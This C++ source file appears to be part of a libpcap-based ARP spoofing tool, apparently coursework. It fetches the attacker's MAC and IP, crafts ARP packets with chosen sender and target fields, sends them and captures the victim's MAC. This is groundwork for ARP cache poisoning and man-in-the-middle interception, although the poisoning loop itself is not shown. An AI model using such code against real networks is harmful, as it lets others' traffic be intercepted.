#include "spoof.h"


Mac Spoof::GetAttackerMac(const char* interface) {
    unsigned char AttackerMac[6];
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    memcpy(AttackerMac, ifr.ifr_hwaddr.sa_data, 6);
    
    close(sock);

    return Mac(AttackerMac);
}

Ip Spoof::GetAttackerIP(const char* interface) {
    static char ip[16];
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFADDR, &ifr);
    
    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(ip, inet_ntoa(addr->sin_addr));
    
    close(sock);
    return Ip(ip);
}


void Spoof::SetArpPacketDefault(struct EthArpPacket& packet) {
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
}

void Spoof::SetPacket(struct EthArpPacket &packet, Mac dmac, Mac smac, uint16_t op, Ip sip, Mac tmac, Ip tip){
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);
}

void Spoof::SendPacket(pcap_t* pcap, struct EthArpPacket& packet) {
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		exit(PCAP_ERROR);
	}
}

void Spoof::GetSenderMac(pcap_t* pcap) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    struct EthArpPacket *etharp;
    int cnt = 0;

    do {
        pcap_next_ex(pcap, &header, &packet);
        etharp = (struct EthArpPacket *)packet;
        cnt++;
        if (cnt == 10) {
            printf("Not Found Arp Packet");
            exit(-1); //TODO error define 
        }
    } while (htons(etharp->eth_.type_) != EthHdr::Arp);

    senderMac_= etharp->arp_.smac();
}

void Spoof::SetSendnTargetIp(char* senderIP, char* targetIP){
    senderIP_ = Ip(senderIP);
    targetIP_ = Ip(targetIP);
}




